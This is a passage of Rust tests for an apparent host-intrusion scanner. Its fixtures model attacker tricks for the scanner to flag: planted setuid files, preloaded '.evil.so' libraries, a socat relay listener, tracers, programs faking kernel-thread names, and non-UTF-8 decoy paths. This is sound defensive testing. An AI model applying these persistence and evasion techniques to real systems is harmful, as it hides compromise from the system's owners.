        root,
        home: None,
        index: &index,
        origin: Origin::Root,
    };
    for path in ["usr/bin/planted", "usr/local/bin/planted"] {
        write(root, path, "x");
        fs::set_permissions(root.join(path), fs::Permissions::from_mode(0o4755)).unwrap();
    }
    // The host's table: a user's FUSE mount over `/usr/local`, whose
    // files show as root's.
    write(
        root,
        "proc/1/mountinfo",
        "22 1 0:21 / / rw,relatime - ext4 /dev/sda1 rw\n\
         40 22 0:40 / /usr/local rw,nosuid,nodev - fuse.sshfs u@host: rw\n",
    );
    // The collector's own, as systemd makes it for a unit with
    // `NoNewPrivileges=yes` and `ProtectSystem=strict`: every mount
    // read-only and `nosuid`. It is not the one that decides.
    write(
        root,
        "proc/self/mountinfo",
        "22 1 0:21 / / ro,nosuid,relatime - ext4 /dev/sda1 rw\n\
         40 22 0:40 / /usr/local ro,nosuid,nodev - fuse.sshfs u@host: rw\n",
    );
    let mut found = super::Found::default();
    super::privileged_files(&scope, &mut found);
    assert!(
        found.of_root.contains("usr/bin/planted"),
        "{:?}",
        found.of_root
    );
    assert!(found.of_accounts.contains("usr/local/bin/planted"));
    assert!(!found.of_root.contains("usr/local/bin/planted"));
    assert!(found.unchecked.is_empty(), "{:?}", found.unchecked);
    // A host table that is not there, or cannot be read, is said, and
    // leaves every set-id file an account's.
    let said = |found: &super::Found, how: &str| {
        let start = format!("/proc/1/mountinfo {how}");
        assert!(
            found.unchecked.iter().any(|said| said.starts_with(&start)),
            "{:?}",
            found.unchecked
        );
        assert!(found.of_root.is_empty(), "{:?}", found.of_root);
        assert!(found.of_accounts.contains("usr/bin/planted"));
    };
    fs::remove_file(root.join("proc/1/mountinfo")).unwrap();
    let mut found = super::Found::default();
    super::privileged_files(&scope, &mut found);
    said(&found, "is not there");
    fs::create_dir(root.join("proc/1/mountinfo")).unwrap();
    let mut found = super::Found::default();
    super::privileged_files(&scope, &mut found);
    said(&found, "could not be read");
}

#[test]
fn a_listener_is_the_accounts_whose_process_holds_it() {
    let (dir, index) = listening_system();
    // The relay is root's; the rest are the test user's.
    detail(
        dir.path(),
        "22",
        "status",
        "Name:\tsocat\nUid:\t0\t0\t0\t0\n",
    );
    let live = look(dir.path(), &index, Origin::Root);
    assert!(!live.of_accounts.contains("usr/bin/socat:tcp-4444"));
    // Any account can leave a socket listening that no process holds.
    assert!(live.of_accounts.contains("proc/net/tcp:31337"));
    for name in [
        "usr/bin/nginx:tcp-8080",
        "usr/bin/python3:tcp-8000:http.server",
    ] {
        assert!(
            live.of_accounts.contains(name),
            "{name}: {:?}",
            live.of_accounts
        );
    }
}

#[test]
fn a_tracer_not_shown_to_be_roots_is_an_accounts() {
    let dir = TempDir::new("live-thread-tracer");
    let root = dir.path();
    let index = PackageIndex::with_foreign(HashSet::new());
    // Two processes attached to by threads, which have no program to read
    // here: one of an account's, one of root's.
    for (pid, tracer, ids) in [("80", "90", "1000"), ("81", "91", "0")] {
        process(root, pid, "/opt/app", &[], "");
        detail(
            root,
            pid,
            "status",
            &format!("Name:\tapp\nTgid:\t{pid}\nPid:\t{pid}\nPPid:\t1\nTracerPid:\t{tracer}\n"),
        );
        detail(
            root,
            tracer,
            "status",
            &format!("Name:\tt\nUid:\t{ids}\t{ids}\t{ids}\t{ids}\n"),
        );
    }
    let live = look(root, &index, Origin::Root);
    let names: Vec<&str> = live.items.iter().map(|item| item.path.as_str()).collect();
    assert!(names.contains(&"proc/90:attached-to-app"), "{names:?}");
    assert!(live.of_accounts.contains("proc/90:attached-to-app"));
    assert!(names.contains(&"proc/91:attached-to-app"), "{names:?}");
    assert!(!live.of_accounts.contains("proc/91:attached-to-app"));
}

#[test]
fn a_tracer_is_roots_only_while_it_still_holds_its_target() {
    let dir = TempDir::new("live-tracer-gone");
    let root = dir.path();
    let index = PackageIndex::with_foreign(HashSet::new());
    let scope = Scope {
        root,
        home: None,
        index: &index,
        origin: Origin::Root,
    };
    // Listed while thread 91 traced it; by the time 91's status is read the
    // number is root's, and the target has no tracer any more.
    detail(root, "91", "status", "Name:\tt\nUid:\t0\t0\t0\t0\n");
    detail(root, "81", "status", "Name:\tapp\nTracerPid:\t0\n");
    let listed = |tracer| super::Listed {
        pid: 81,
        status: super::Status {
            name: "app".into(),
            group: 81,
            parent: 1,
            tracer,
            of_root: false,
        },
        started_as: None,
        kernel_thread: false,
    };
    let running = super::Running {
        listed: vec![listed(91)],
        ..super::Running::default()
    };
    let mut found = super::Found::default();
    super::kernel::check(&scope, &running, &mut found);
    assert!(found.of_accounts.contains("proc/91:attached-to-app"));
    assert!(!found.of_root.contains("proc/91:attached-to-app"));
    // Attached to by another since, or still by the same: root's only then.
    for (now, of_root) in [("92", false), ("91", true)] {
        detail(
            root,
            "81",
            "status",
            &format!("Name:\tapp\nTracerPid:\t{now}\n"),
        );
        let mut found = super::Found::default();
        super::kernel::check(&scope, &running, &mut found);
        assert_eq!(
            found.of_root.contains("proc/91:attached-to-app"),
            of_root,
            "{now}"
        );
    }
}

#[test]
fn what_an_environment_names_makes_no_name_or_note_past_a_paths_length() {
    let dir = TempDir::new("live-long-preload");
    let root = dir.path();
    let index = PackageIndex::with_foreign(HashSet::new());
    let long_path = format!("/tmp/{}", "a".repeat(5000));
    // Control characters, which JSON writes as six bytes each.
    let long_name = "\u{1}".repeat(20_000);
    process(
        root,
        "8",
        "/opt/app",
        &[],
        &format!("LD_PRELOAD={long_path}:{long_name};"),
    );
    let live = look(root, &index, Origin::Root);
    for item in &live.items {
        assert!(item.path.len() < 4096, "{}", item.path.len());
        for note in item
            .notes
            .iter()
            .chain(item.alerts.iter().map(|(_, seen)| seen))
        {
            let written = crate::json::Json::from(note.as_str()).to_string().len();
            // The quotes, and the mark of what was cut.
            assert!(written <= 10 * 1024 + 2 + '…'.len_utf8(), "{written}");
        }
    }
    let app = live
        .items
        .iter()
        .find(|item| item.path == "opt/app")
        .unwrap();
    assert!(
        app.notes.contains(
            &"process 8 preloads a path of 5004 bytes, longer than any the kernel opens".into()
        ),
        "{:?}",
        app.notes
    );
    assert!(
        app.alerts
            .iter()
            .all(|(rule, _)| *rule == RuleId::PreloadedLibrary)
    );
    assert!(app.notes.iter().any(|note| note.ends_with('…')));
}

#[test]
fn a_note_is_cut_by_the_bytes_json_writes() {
    let most = super::MAX_NOTE_BYTES;
    assert_eq!(super::cut_note("a".repeat(most)), "a".repeat(most));
    assert_eq!(
        super::cut_note("a".repeat(most + 1)),
        format!("{}…", "a".repeat(most))
    );
    // Six bytes each.
    assert_eq!(
        super::cut_note("\u{1}".repeat(most)),
        format!("{}…", "\u{1}".repeat(most / 6))
    );
}

#[test]
fn a_first_argument_past_what_is_read_is_kept_cut() {
    use super::process::MAX_START_BYTES;
    let dir = TempDir::new("live-cut-argument");
    let root = dir.path();
    let index = PackageIndex::with_foreign(HashSet::new());
    // Named like a kernel thread, with a first argument that runs past
    // what is read and has no null byte: it is still a program.
    process(root, "4", "/opt/kworker", &[], "");
    detail(root, "4", "status", "Name:\t[kworker/0:1]\n");
    detail(root, "4", "cmdline", &"z".repeat(MAX_START_BYTES * 2));
    let live = look(root, &index, Origin::Root);
    let kworker = live
        .items
        .iter()
        .find(|item| item.path == "opt/kworker")
        .unwrap();
    assert!(
        kworker
            .notes
            .iter()
            .any(|note| note.contains("named like a kernel thread")),
        "{kworker:?}"
    );
}

#[test]
fn what_of_a_process_is_not_utf8_is_told() {
    use std::ffi::OsStr;
    use std::os::unix::ffi::OsStrExt;
    use std::path::Path;

    use super::process::not_utf8;
    assert_eq!(
        not_utf8(None, b"x\0a.py\0", Some(b"LD_PRELOAD=/a.so\0")),
        None
    );
    let odd = Path::new(OsStr::from_bytes(b"/tmp/\xff"));
    assert!(not_utf8(Some(odd), b"", None).is_some());
    assert!(not_utf8(None, b"python3\0/tmp/\xfe.py\0", None).is_some());
    // A cut in the middle of a character counts too: its argument is left
    // out as well.
    assert!(not_utf8(None, b"x\0\xc3", None).is_some());
    assert!(not_utf8(None, b"", Some(b"A=\xff\0LD_PRELOAD=/\xff.so\0")).is_some());
    assert!(not_utf8(None, b"", Some(b"LD_AUDIT=/a\xc3\0")).is_some());
    // Only what names a file counts.
    assert_eq!(not_utf8(None, b"", Some(b"A=\xff\0")), None);

    // Read lossily, each would name a file named with U+FFFD: a decoy.
    assert_eq!(preloaded(Some(b"LD_PRELOAD=/tmp/evil\xc3\0")), []);
    assert_eq!(super::searched(Some(b"LD_LIBRARY_PATH=/tmp/\xff\0")), []);
}

#[test]
fn a_process_whose_names_are_not_utf8_is_an_item_of_its_owner() {
    use std::ffi::OsStr;
    use std::os::unix::ffi::OsStrExt;

    let dir = TempDir::new("live-not-utf8");
    let root = dir.path();
    let index = PackageIndex::with_foreign(HashSet::new());
    fs::create_dir_all(root.join("tmp")).unwrap();
    fs::create_dir_all(root.join("home/u")).unwrap();
    fs::write(root.join("home/u/.evil.so"), "library").unwrap();
    for decoy in ["tmp/\u{fffd}", "tmp/\u{fffd}.py", "tmp/evil\u{fffd}"] {
        fs::write(root.join(decoy), "decoy").unwrap();
    }
    let program = |pid: &str, exe: &[u8]| {
        process(root, pid, "/usr/bin/x", &[], "");
        fs::remove_file(root.join(format!("proc/{pid}/exe"))).unwrap();
        symlink(OsStr::from_bytes(exe), root.join(format!("proc/{pid}/exe"))).unwrap();
    };
    // Root's and an account's, with a program whose path is not UTF-8.
    program("4", b"/memfd:\xff (deleted)");
    program("5", b"/tmp/\xff");
    detail(root, "5", "status", "Name:\tx\nUid:\t0\t0\t0\t0\n");
    // An account's, with a script named so.
    process(root, "6", "/usr/bin/python3", &[], "");
    fs::write(root.join("proc/6/cmdline"), b"python3\0/tmp/\xff.py\0").unwrap();
    // An account's, run from a temporary directory with a working
    // directory named so: it is still checked.
    process(root, "7", "/tmp/run", &[], "");
    symlink(OsStr::from_bytes(b"/tmp/\xff"), root.join("proc/7/cwd")).unwrap();
    // Root's, with a working directory named so.
    process(root, "9", "/usr/bin/x", &[], "");
    detail(root, "9", "status", "Name:\tx\nUid:\t0\t0\t0\t0\n");
    symlink(OsStr::from_bytes(b"/tmp/\xff"), root.join("proc/9/cwd")).unwrap();
    // An account's, preloading two libraries, one named so.
    process(root, "8", "/usr/bin/x", &[], "");
    fs::write(
        root.join("proc/8/environ"),
        b"LD_PRELOAD=/home/u/.evil.so:/tmp/evil\xc3\0",
    )
    .unwrap();

    let live = look(root, &index, Origin::Root);
    let item = |path: &str| live.items.iter().find(|item| item.path == path);
    let said = |path: &str, rule: Option<RuleId>, text: &str| {
        item(path).is_some_and(|item| {
            item.notes.iter().any(|note| note.contains(text))
                && rule.is_none_or(|rule| item.alerts.iter().any(|(alert, _)| *alert == rule))
        })
    };
    assert!(said(
        "proc/4",
        Some(RuleId::HiddenProgram),
        "process 4 (/memfd:\\xff (deleted)): the path of its program is not UTF-8"
    ));
    assert!(live.of_accounts.contains("proc/4"));
    assert!(said(
        "proc/5",
        Some(RuleId::HiddenProgram),
        "program is not UTF-8"
    ));
    assert!(live.of_root.contains("proc/5"));
    assert!(said(
        "proc/6",
        Some(RuleId::HiddenProgram),
        "command line is not UTF-8"
    ));
    // The note shows the bytes as they are, escaped, not a lossy name.
    assert!(said("proc/6", None, "python3 /tmp/\\xff.py"));
    assert!(live.of_accounts.contains("proc/6"));
    assert!(said(
        "proc/7",
        Some(RuleId::HiddenProgram),
        "working directory is not UTF-8"
    ));
    assert!(live.of_accounts.contains("proc/7"));
    assert!(said(
        "proc/9",
        Some(RuleId::HiddenProgram),
        "working directory is not UTF-8"
    ));
    assert!(live.of_root.contains("proc/9"));
    assert!(item("tmp/run").is_some_and(|item| !item.alerts.is_empty()));
    assert!(said(
        "proc/8",
        Some(RuleId::HiddenProgram),
        "loader load is not UTF-8"
    ));
    assert!(item("home/u/.evil.so").is_some_and(|item| {
        item.alerts
            .iter()
            .any(|(alert, _)| *alert == RuleId::PreloadedLibrary)
    }));
    assert!(!live.items.iter().any(|item| item.path.contains('\u{fffd}')));
    assert!(
        !live
            .unchecked
            .iter()
            .any(|sentence| sentence.contains("UTF-8")),
        "{:?}",
        live.unchecked
    );

    // Where it was started is still marked, from the bytes of its name.
    let running = super::process::processes(root);
    let seven = running.processes.iter().find(|process| process.pid == "7");
    assert_eq!(
        seven.and_then(|process| process.cwd_mark.clone()),
        Some(super::program::cwd_mark(b"tmp/\xff"))
    );
}

#[test]
fn a_script_whose_utf8_name_holds_a_replacement_character_is_checked() {
    let dir = TempDir::new("live-replacement-character");
    let root = dir.path();
    let index = PackageIndex::with_foreign(HashSet::new());
    fs::create_dir_all(root.join("tmp")).unwrap();
    fs::write(root.join("tmp/\u{fffd}.py"), "print()").unwrap();
    process(root, "10", "/usr/bin/python3", &[], "");
    fs::write(
        root.join("proc/10/cmdline"),
        "python3\0/tmp/\u{fffd}.py\0".as_bytes(),
    )
    .unwrap();

    let live = look(root, &index, Origin::Root);
    assert!(
        live.items.iter().any(|item| item.path == "tmp/\u{fffd}.py"
            && item
                .alerts
                .iter()
                .any(|(rule, _)| *rule == RuleId::RunningFromTemp)),
        "{:?}",
        live.items
    );
    assert!(!live.items.iter().any(|item| item.path == "proc/10"));
}

#[test]
fn a_program_that_blanks_its_arguments_is_not_taken_for_a_kernel_thread() {
    let dir = TempDir::new("live-blank-arguments");
    let root = dir.path();
    let index = PackageIndex::with_foreign(HashSet::new());
    // Its arguments blanked, as `memset(argv[0], 0, …)` leaves them; and
    // one the kernel marks a kernel thread (`PF_KTHREAD`).
    let fields = |flags: u32| format!("S 1 1 1 0 -1 {flags} 0 0");
    for (pid, exe, flags) in [
        ("5", "/opt/blank", 0x0040_0000),
        ("6", "/opt/kernel", 0x0020_0040),
    ] {
        process(root, pid, exe, &[], "");
        detail(root, pid, "status", "Name:\t[kworker/0:1]\n");
        detail(root, pid, "cmdline", "\0\0\0\0");
        detail(
            root,
            pid,
            "stat",
            &format!("{pid} ([kworker/0:1]) {}\n", fields(flags)),
        );
    }
    let live = look(root, &index, Origin::Root);
    let posing = |path: &str| {
        live.items.iter().any(|item| {
            item.path == path
                && item
                    .notes
                    .iter()
                    .any(|note| note.contains("named like a kernel thread"))
        })
    };
    assert!(posing("opt/blank"));
    assert!(!posing("opt/kernel"));
}

#[test]
fn an_environment_is_read_no_further_than_exec_can_place_one() {
    use super::process::{MAX_ENVIRON_BYTES, MAX_START_BYTES};
    let dir = TempDir::new("live-environ-cap");
    let root = dir.path();
    // Entries of the most kept, then one making up the rest, `bytes` in all.
    let filler = |bytes: usize| {
        let entry = format!("A={};", "x".repeat(MAX_START_BYTES - 3));
        let mut text = entry.repeat(bytes / entry.len());
        let _ = write!(text, "B={};", "x".repeat(bytes % entry.len() - 3));
        text
    };
    let tail = "LD_PRELOAD=/z.so;";
    let most = usize::try_from(MAX_ENVIRON_BYTES).unwrap();
    // Longer than `exec` can place, as one pointed at other memory is, with
    // a variable the checks read past that; and one exactly as long as
    // that, which is read whole.
    process(root, "4", "/opt/big", &[], &(filler(most + 3) + tail));
    process(
        root,
        "9",
        "/opt/big",
        &[],
        &(filler(most - tail.len()) + tail),
    );
    host_mounts(root);
    let running = super::processes(root);
    let of = |pid: &str| running.processes.iter().find(|p| p.pid == pid).unwrap();
    assert!(of("4").read_in_part);
    assert_eq!(of("4").environment.as_deref(), Some(&b""[..]));
    assert!(!of("9").read_in_part);
    assert_eq!(
        of("9").environment.as_deref(),
        Some(&b"LD_PRELOAD=/z.so\0"[..])
    );
}

#[test]
fn a_process_is_read_only_so_far_and_that_is_said() {
    use super::process::MAX_START_BYTES;
    let dir = TempDir::new("live-read-in-part");
    let root = dir.path();
    let index = PackageIndex::with_foreign(HashSet::new());
    // Thousands of open files before a keyboard (a device the test cannot
    // tell is no keyboard counts as one), a socket held twice, and two
    // cameras, of which the one on the lower descriptor is named.
    let mut fds: Vec<(String, &str)> = (0..5000).map(|fd| (fd.to_string(), "/dev/null")).collect();
    fds.extend([
        ("5000".to_string(), "socket:[77]"),
        ("5001".to_string(), "/dev/input/event0"),
        ("5002".to_string(), "socket:[77]"),
        ("6000".to_string(), "/dev/video2"),
        ("5003".to_string(), "/dev/video0"),
    ]);
    let fds: Vec<(&str, &str)> = fds.iter().map(|(fd, to)| (fd.as_str(), *to)).collect();
    process(root, "7", "/opt/app", &fds, "");
    // A variable the checks read after one longer than what is kept,
    // which is not one they read, and whose part past that looks like one.
    let padded = format!(
        "A=1;B={}LD_AUDIT=/tmp/f.so;LD_PRELOAD=/tmp/e.so;",
        "x".repeat(MAX_START_BYTES - 1)
    );
    process(root, "6", "/opt/app", &[], &padded);
    // One the checks read that is longer than what is kept: it and all
    // after it are left out.
    let long = format!(
        "LD_PRELOAD=/a.so;LD_LIBRARY_PATH={};LD_PRELOAD=/b.so;",
        "y".repeat(MAX_START_BYTES)
    );
    process(root, "5", "/opt/app", &[], &long);
    // A command line that runs past what is kept, an account's and root's.
    let arguments = format!("app\0{}\0last\0", "y".repeat(MAX_START_BYTES));
    for pid in ["8", "3"] {
        process(root, pid, "/opt/app", &[], "");
        detail(root, pid, "cmdline", &arguments);
    }
    detail(root, "3", "status", "Name:\tapp\nUid:\t0\t0\t0\t0\n");
    host_mounts(root);
    let running = super::processes(root);
    let of = |pid: &str| running.processes.iter().find(|p| p.pid == pid).unwrap();
    let read_in_part: Vec<&str> = running
        .processes
        .iter()
        .filter(|process| process.read_in_part)
        .map(|process| process.pid.as_str())
        .collect();
    assert_eq!(read_in_part, ["3", "5", "8"]);
    assert!(of("7").open.keyboard);
    assert_eq!(of("7").open.sockets, [(5000, 77)]);
    assert_eq!(of("7").open.camera.as_deref(), Some("/dev/video0"));
    assert_eq!(
        of("6").environment.as_deref(),
        Some(&b"LD_PRELOAD=/tmp/e.so\0"[..])
    );
    assert_eq!(
        of("5").environment.as_deref(),
        Some(&b"LD_PRELOAD=/a.so\0"[..])
    );
    assert_eq!(of("8").arguments(), ["app"]);
    let live = look(root, &index, Origin::Root);
    // Root's own leaves root's checks incomplete; an account's is the
    // account's item.
    assert_eq!(
        live.unchecked,
        [
            "1 of root's running process(es) were looked at only in part: past 256 KiB of command \
          line or of the library and Python search variables, or 6 MiB of environment"
        ]
    );
    let app = live
        .items
        .iter()
        .find(|item| item.path == "opt/app")
        .unwrap();
    for (pid, started) in [("5", ""), ("8", "app")] {
        let start = format!("process {pid} ({started}) was looked at only in part");
        assert!(
            app.notes.iter().any(|note| note.starts_with(&start)),
            "{app:?}"
        );
    }
    assert!(
        app.notes
            .iter()
            .any(|note| note.starts_with("process 7 () reads the keyboard")),
        "{app:?}"
    );
    assert!(live.of_accounts.contains("opt/app"));
    assert!(
        live.of_accounts.contains("tmp/e.so"),
        "{:?}",
        live.of_accounts
    );
}

#[test]
fn a_mount_on_an_entry_is_told_by_the_walks_own_table() {
    use super::mount_table::{kind_in, kinds_by_id};
    use super::pinned::MountKind;
    let kind = |mountinfo: &[u8], mount| kind_in(&kinds_by_id(mountinfo), mount);
    let mountinfo = b"\
22 1 8:2 / / rw,relatime shared:1 - ext4 /dev/sda2 rw
30 22 8:2 /var/lib/x /var/lib/x rw,nosuid - ext4 /dev/sda2 rw
31 22 0:50 / /home/u/x rw,nosuid,nodev - fuse.sshfs host: rw,user_id=1000,group_id=1000
32 22 0:51 / /mnt rw - fuse.x x rw,user_id=0,group_id=0
33 22 0:52 / /tmp/x rw,nosuid - tmpfs tmpfs rw
34 22 0:53 / /home/u/a\\040-\\040b rw - fuseblk /dev/sdb1 rw,user_id=1000
35 22 0:54 / /home/u/\xff rw,nosuid,nodev - fuse.\xff \xff rw,user_id=1000,group_id=1000
";
    assert_eq!(kind(mountinfo, 31), MountKind::Accounts);
    assert_eq!(kind(mountinfo, 34), MountKind::Accounts);
    // An account's mount named in bytes that are not UTF-8 spoils no line.
    assert_eq!(kind(mountinfo, 35), MountKind::Accounts);
    // A bind (as systemd makes for a unit's `StateDirectory=`), root's own
    // FUSE mount, or another filesystem.
    assert_eq!(kind(mountinfo, 30), MountKind::Roots);
    assert_eq!(kind(mountinfo, 32), MountKind::Roots);
    assert_eq!(kind(mountinfo, 33), MountKind::Roots);
    // One not in the table: unmounted since it was held.
    assert_eq!(kind(mountinfo, 99), MountKind::Gone);
    assert_eq!(kind(b"", 30), MountKind::Gone);
    assert_eq!(kind(b"30 22 8:2", 30), MountKind::Gone);
}

#[test]
fn what_the_walks_own_table_says_of_a_mount_decides_whether_it_is_asked() {
    use std::io;

    use super::pinned::{Held, MountKind};
    use super::privileged::{Asked, askable};
    let ask = |kind: fn() -> io::Result<MountKind>| {
        askable(Held::Mounted(fs::File::open("/").unwrap(), 30), |_| kind())
    };
    // An account's FUSE mount is never asked about; root's always, the
    // host's table aside: a home root mounts during the sweep is walked.
    assert!(matches!(
        ask(|| Ok(MountKind::Accounts)),
        Some(Asked::Covered)
    ));
    assert!(matches!(ask(|| Ok(MountKind::Roots)), Some(Asked::File(_))));
    // Gone since it was held: held again.
    assert!(ask(|| Ok(MountKind::Gone)).is_none());
    // A table the walk could not read tells nothing, and nothing is asked:
    // the mount may be an account's that never answers.
    let unread = || Err(io::Error::other("no table"));
    assert!(matches!(ask(unread), Some(Asked::Unknown)));
    // On its directory's own mount, no table is read.
    let here = Held::Here(fs::File::open("/").unwrap());
    assert!(matches!(
        askable(here, |_| unreachable!()),
        Some(Asked::File(_))
    ));
}

/// When the walk holds the file `trigger` in `a` or `b`, swaps the other
/// for a directory of root's holding another set-id file, as a package
/// upgrade replaces what it installs, or with `gone` removes it; reads no
/// capabilities. Whichever is walked first, the other is then still to be
/// walked, listed as it was before.
fn swaps_the_other(held: &fs::File) -> std::io::Result<Option<Capabilities>> {
    use std::os::fd::AsRawFd;
    let path = fs::read_link(format!("/proc/self/fd/{}", held.as_raw_fd()))?;
    if path.file_name().is_none_or(|name| name != "trigger") {
        return Ok(None);
    }
    let directory = path.parent().unwrap();
    let top = directory.parent().unwrap();
    let other = top.join(if directory.ends_with("a") { "b" } else { "a" });
    if top.join("old").exists() {
        return Ok(None);
    }
    if top.join("gone").exists() {
        fs::create_dir(top.join("old"))?;
        fs::remove_dir_all(&other)?;
    } else {
        fs::rename(&other, top.join("old"))?;
        setuid_file(&other.join("new"));
    }
    Ok(None)
}

#[test]
fn a_directory_root_swaps_during_the_walk_is_walked_as_it_is_now() {
    let dir = TempDir::new("live-walk-root-swaps");
    let root = dir.path();
    for side in ["a", "b"] {
        fs::create_dir_all(root.join(format!("usr/local/{side}"))).unwrap();
        fs::write(root.join(format!("usr/local/{side}/trigger")), "").unwrap();
    }
    let found = walk_as_root(root, files(100), swaps_the_other, ONE_MOUNT);
    assert!(
        ["usr/local/a/new", "usr/local/b/new"]
            .iter()
            .any(|new| found.items.contains_key(*new)),
        "{:?}",
        found.items.keys()
    );
    assert_eq!(found.unchecked, Vec::<String>::new());
    // One root removes meanwhile holds nothing.
    let dir = TempDir::new("live-walk-root-removes");
    let root = dir.path();
    for side in ["a", "b"] {
        fs::create_dir_all(root.join(format!("usr/local/{side}"))).unwrap();
        fs::write(root.join(format!("usr/local/{side}/trigger")), "").unwrap();
    }
    fs::write(root.join("usr/local/gone"), "").unwrap();
    let found = walk_as_root(root, files(100), swaps_the_other, ONE_MOUNT);
    assert_eq!(found.unchecked, Vec::<String>::new());
}

#[test]
fn the_walk_goes_down_to_its_depth_and_counts_what_is_deeper() {
    let dir = TempDir::new("live-walk-depth");
    let root = dir.path();
    let mut deepest = root.join("usr");
    for _ in 0..64 {
        deepest.push("d");
    }
    // The directory 64 below the start is listed; one below it is not.
    setuid_file(&deepest.join("s"));
    let found = walk_as_root(root, files(1_000), none_anywhere, ONE_MOUNT);
    assert!(found.unchecked.is_empty(), "{:?}", found.unchecked);
    assert_eq!(found.items.len(), 1, "{:?}", found.items.keys());
    fs::create_dir(deepest.join("d")).unwrap();
    let found = walk_as_root(root, files(1_000), none_anywhere, ONE_MOUNT);
    assert!(
        found
            .unchecked
            .iter()
            .any(|said| said.starts_with("1 directory(ies) more than 64")),
        "{:?}",
        found.unchecked
    );
}

#[test]
fn files_with_the_hosts_capabilities_are_never_cut() {
    let dir = TempDir::new("live-walk-many-capabilities");
    let root = dir.path();
    for index in 0..1_001 {
        setuid_file(&root.join(format!("var/tmp/{index}")));
    }
    fs::set_permissions(root.join("var/tmp"), fs::Permissions::from_mode(0o1777)).unwrap();
    // No account can give its files the host's capabilities, so they come
    // without bound only where root gave them.
    let found = walk_as_root(root, files(10_000), net_raw_everywhere, ONE_MOUNT);
    assert!(
        found
            .notes
            .iter()
            .all(|note| !note.contains("were counted, not looked at")),
        "{:?}",
        found.notes
    );
}

#[test]
fn past_a_number_the_accounts_set_id_files_are_counted() {
    let dir = TempDir::new("live-walk-many");
    let root = dir.path();
    for index in 0..1_001 {
        let path = root.join(format!("var/tmp/{index}"));
        setuid_file(&path);
        // Run as root, the files would be root's own, which are never cut.
        // Give them to an account (nobody), then set the bits again, since
        // a change of owner clears them.
        if crate::user::real_uid() == Some(0) {
            std::os::unix::fs::chown(&path, Some(65_534), Some(65_534)).unwrap();
            fs::set_permissions(&path, fs::Permissions::from_mode(0o4755)).unwrap();
        }
    }
    fs::set_permissions(root.join("var/tmp"), fs::Permissions::from_mode(0o1777)).unwrap();
    let found = walk_as_root(root, files(10_000), none_anywhere, ONE_MOUNT);
    assert_eq!(found.items.len(), 1_000);
    assert!(
        found.notes.iter().any(|note| note
            .starts_with("1 more setuid or setgid file(s) of the accounts' own")
            && note.ends_with(
                "past 1000 of one owner's, or of those on mounts where set-id \
                                   bits have no effect"
            )),
        "{:?}",
        found.notes
    );
}

#[test]
fn the_accounts_set_id_files_count_against_their_owner_only_where_owners_are_real() {
    use super::privileged::MAX_ACCOUNTS_ITEMS;
    let dir = TempDir::new("live-walk-owners");
    let root = dir.path();
    let theirs = root.join("var/tmp");
    // On a mount without set-id, owners are what the filesystem says, so
    // all share one bound; past it, a file on a mount where set-id bits
    // take effect is still looked at, under its owner's bound.
    for index in 0..MAX_ACCOUNTS_ITEMS {
        setuid_file(&theirs.join(format!("n/{index}")));
    }
    setuid_file(&theirs.join("s/x"));
    fs::set_permissions(&theirs, fs::Permissions::from_mode(0o1777)).unwrap();
    let mountinfo = format!("{ONE_MOUNT}23 22 0:22 / /var/tmp/n rw,nosuid - tmpfs tmpfs rw\n");
    let found = walk_as_root(root, files(10_000), none_anywhere, &mountinfo);
    assert!(found.items.contains_key("var/tmp/s/x"));
    assert!(
        !found
            .notes
            .iter()
            .any(|note| note.contains("were counted, not looked at")),
        "{:?}",
        found.notes
    );
}

/// What `privileged_walk` would hold of the entry `name` of `directory`,
/// for a tree with nothing mounted in it.
fn held_here(
    directory: &fs::File,
    mount: u64,
    name: &std::ffi::OsStr,
) -> std::io::Result<super::privileged::Asked> {
    use super::pinned::Held;
    use super::privileged::Asked;
    Ok(match super::pinned::hold(directory, mount, name)? {
        Held::Here(file) => Asked::File(file),
        Held::Mounted(..) => Asked::Unknown,
    })
}

#[test]
fn what_the_walk_could_not_ask_about_is_said_by_whose_it_may_be() {
    use std::collections::HashSet;
    use std::ffi::OsStr;

    use super::privileged::{Ask, Asked, privileged_walk_asking};
    let dir = TempDir::new("live-walk-asked");
    let root = dir.path();
    for file in ["usr/a/covered", "usr/b/unknown", "usr/c/gone"] {
        write(root, file, "");
    }
    for directory in ["usr/d", "usr/e", "usr/f"] {
        fs::create_dir_all(root.join(directory)).unwrap();
    }
    // Entries named for an answer get it; the directories `d`, `e` and
    // `f` are held as they are in their listing, and get theirs when held
    // again to be opened.
    let mut seen = HashSet::new();
    let mut entry = |directory: &fs::File, mount: u64, name: &OsStr| {
        let again = !seen.insert(name.to_os_string());
        match (name.to_str(), again) {
            (Some("covered"), _) | (Some("f"), true) => Ok(Asked::Covered),
            (Some("unknown"), _) | (Some("d"), true) => Ok(Asked::Unknown),
            (Some("gone"), _) | (Some("e"), true) => Ok(Asked::Gone),
            _ => held_here(directory, mount, name),
        }
    };
    let index = PackageIndex::with_foreign(HashSet::new());
    let scope = Scope {
        root,
        home: None,
        index: &index,
        origin: Origin::Root,
    };
    let mut closed = super::Closed {
        mounts: Some(super::mounts(ONE_MOUNT)),
        ..super::Closed::default()
    };
    let mut found = super::Found::default();
    let ask = Ask {
        capabilities: none_anywhere,
        entry: &mut entry,
    };
    privileged_walk_asking(&scope, &mut found, &mut closed, files(100), ask);
    // What may be anything leaves root's place not checked: the listing
    // of `usr/b`, and `usr/d`.
    assert_eq!(
        found.unchecked,
        [
            "setuid programs were not looked for in 2 place(s) that could not be listed \
          (/usr/b among them)"
        ]
    );
    // Gone on every hold, only an account mounts there: a note, and the
    // listing of `usr/c` stays whole.
    assert!(
        found.notes.contains(
            &"setuid programs and files with capabilities were not looked for in 2 place(s) \
              accounts may write that could not be listed (/usr/c/gone among them)"
                .to_string()
        ),
        "{:?}",
        found.notes
    );
    assert!(
        found.notes.iter().any(|note| note.starts_with(
            "2 place(s) on mounts closed to root were not looked into (/usr/a/covered among \
                 them)"
        )),
        "{:?}",
        found.notes
    );
}

#[test]
fn an_entry_whose_mount_is_gone_is_held_again_up_to_three_times() {
    use std::ffi::OsStr;

    use super::pinned::{MountKind, mount_of};
    use super::privileged::{Asked, hold_asked};
    // `/proc` is a mount of its own wherever the tests run.
    let top = fs::File::open("/").unwrap();
    let mount = mount_of(&top).unwrap();
    let mut looked_up = 0;
    let mut gone_twice = |_| {
        looked_up += 1;
        Ok(if looked_up < 3 {
            MountKind::Gone
        } else {
            MountKind::Roots
        })
    };
    let asked = hold_asked(&top, mount, OsStr::new("proc"), &mut gone_twice).unwrap();
    assert!(matches!(asked, Asked::File(_)), "{asked:?}");
    assert_eq!(looked_up, 3);
    let mut looked_up = 0;
    let mut gone = |_| {
        looked_up += 1;
